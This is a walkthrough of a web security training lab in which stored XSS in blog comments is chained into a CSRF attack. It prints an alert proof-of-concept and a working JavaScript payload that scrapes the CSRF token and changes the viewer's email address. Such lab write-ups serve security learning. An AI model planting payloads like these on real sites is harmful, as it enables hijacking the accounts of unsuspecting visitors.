# Lab: Exploiting XSS to perform CSRF

 This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter 


# Step 1 Find XSS in blog comments

I want to create a simple alert POC script in a blog comment and see if it executes when I view the comment:

**payload**
```html
<script>alert(document.domain)</script>
```
![image](https://user-images.githubusercontent.com/83407557/211019454-47cfdc52-e085-4318-9fa0-9b099ade73a8.png)

When I view the comment I get a alert box:

![image](https://user-images.githubusercontent.com/83407557/211019586-258b22b7-cb9c-43c9-87ff-143f8fdec1e9.png)

# Step 2 create a CSRF payload

I want to make a POC that changes my email, I login and make the request to change it to test@test.com:

![image](https://user-images.githubusercontent.com/83407557/211019843-119133f6-9444-4f24-ab98-5aed93d40dd4.png)

I then find the request in my HTTP history:

![image](https://user-images.githubusercontent.com/83407557/211020063-2cb91a4a-9234-4944-9313-fdbc5ab9cd12.png)

I see that there is a csrf token, and that I need to have the victim make a POST request to /my-account/change-email.

```html
<script>
var pwn = new XMLHttpRequest();
pwn.onload = email;
pwn.open('get','/my-account',true);
pwn.send();
function email() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var NewEmail = new XMLHttpRequest();
    NewEmail.open('post', '/my-account/change-email', true);
    NewEmail.send('csrf='+token+'&email=hermh4cks@gmail.com')
};
</script>
```
# Step 3 store the XSS->CSRF payload

I want to add the above to another comment and see if my email gets changed to hermh4cks@gmail.com:

![image](https://user-images.githubusercontent.com/83407557/211023131-490bc8b5-8130-4a7a-a43f-6f7ba73751cd.png)

I view the post:

![image](https://user-images.githubusercontent.com/83407557/211023231-ba1983ca-26ab-458f-9de9-f08939449b85.png)

And see that my email has been changed:

![image](https://user-images.githubusercontent.com/83407557/211023328-388eb17e-a141-431c-b991-fc454a1a0ae8.png)

Anyone else that views the post will now also have their email (if they are logged in) to hermh4cks@gmail.com, which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/211023471-f9f02ebe-1e32-4dc2-88f8-9e7997d25749.png)
